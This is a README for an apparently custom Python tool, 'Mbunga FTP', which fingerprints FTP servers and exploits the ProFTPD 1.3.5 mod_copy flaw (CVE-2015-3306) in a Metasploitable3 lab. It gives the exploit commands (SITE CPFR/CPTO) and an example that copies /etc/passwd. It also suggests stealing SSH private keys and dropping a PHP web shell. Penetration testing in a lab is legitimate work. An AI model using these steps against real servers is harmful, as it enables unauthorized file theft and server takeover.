# Mbunga FTP v0.2

FTP enumeration/fingerprinting + ProFTPD mod_copy exploit (CVE-2015-3306)
for the authorized Metasploitable3 lab, implemented directly with Python
sockets. It does not invoke Metasploit or Nmap.

## Install
```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -e .
```

## Test
```bash
mbunga-ftp 192.168.0.48
mbunga-ftp 192.168.0.48 --json ftp-result.json
```

## Exploit (Metasploitable3 / ProFTPD 1.3.5)
```bash
mbunga-ftp 192.168.0.48 --exploit
mbunga-ftp 192.168.0.48 --exploit --src /etc/passwd --dst /tmp/mbunga-proof.txt
```

The exploit module:
1. Fingerprint: banner must be ProFTPD 1.3.5.
2. Non-destructive probe: `SITE CPFR /etc/passwd` must return 350
   (mod_copy present and unpatched).
3. PoC: `SITE CPFR <src>` + `SITE CPTO <dst>` -> arbitrary file copy
   on the server (CVE-2015-3306).

Lab escalation ideas: copy an SSH private key into the anonymous FTP
directory and RETR it, or drop a PHP shell into the webroot.

Current scope: banner, SYST, FEAT, HELP, product/version fingerprinting,
JSON output, and the mod_copy exploit PoC.
